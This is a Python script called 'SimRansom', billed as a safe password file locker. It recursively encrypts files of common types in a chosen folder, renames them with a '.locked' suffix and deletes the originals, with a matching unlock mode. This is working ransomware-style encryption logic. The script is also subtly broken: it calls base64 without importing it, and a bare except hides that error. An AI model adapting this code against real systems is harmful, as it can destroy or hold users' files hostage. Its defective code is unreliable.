#!/usr/bin/env python3
import os
import hashlib
from cryptography.fernet import Fernet
from getpass import getpass
from colorama import Fore, Style, init

init(autoreset=True)

# ✅ Password to Fernet key conversion (using SHA256)
def generate_key(password):
    hash_digest = hashlib.sha256(password.encode()).digest()
    return Fernet(base64.urlsafe_b64encode(hash_digest[:32]))

# ✅ File encryption
def encrypt_file(filepath, cipher):
    with open(filepath, 'rb') as f:
        data = f.read()
    encrypted = cipher.encrypt(data)
    with open(filepath + ".locked", 'wb') as f:
        f.write(encrypted)
    os.remove(filepath)
    print(f"{Fore.GREEN}[✓] Encrypted: {filepath} ➜ {filepath}.locked")

# ✅ File decryption
def decrypt_file(filepath, cipher):
    with open(filepath, 'rb') as f:
        data = f.read()
    decrypted = cipher.decrypt(data)
    original = filepath.replace(".locked", "")
    with open(original, 'wb') as f:
        f.write(decrypted)
    os.remove(filepath)
    print(f"{Fore.YELLOW}[✓] Decrypted: {filepath} ➜ {original}")

# ✅ Main logic
def main():
    print(Fore.CYAN + "\n🔐 SimRansom — Safe File Locker using Password\n")

    mode = input("🔄 Mode (lock/unlock): ").strip().lower()
    folder = input("📁 Enter target folder path: ").strip()

    if not os.path.isdir(folder):
        print(Fore.RED + "[X] Invalid folder!")
        return

    password = getpass("🔑 Enter password: ")
    try:
        cipher = generate_key(password)
    except:
        print(Fore.RED + "[X] Key generation failed.")
        return

    for root, dirs, files in os.walk(folder):
        for file in files:
            filepath = os.path.join(root, file)
            if mode == 'lock' and not file.endswith('.locked'):
                if file.split('.')[-1] in ['txt', 'jpg', 'pdf', 'mp3', 'py', 'json', 'sh', 'apk']:
                    try:
                        encrypt_file(filepath, cipher)
                    except Exception as e:
                        print(Fore.RED + f"[!] Encryption failed: {filepath}")
            elif mode == 'unlock' and file.endswith('.locked'):
                try:
                    decrypt_file(filepath, cipher)
                except Exception as e:
                    print(Fore.RED + f"[!] Wrong password or error: {filepath}")

if __name__ == '__main__':
    main()
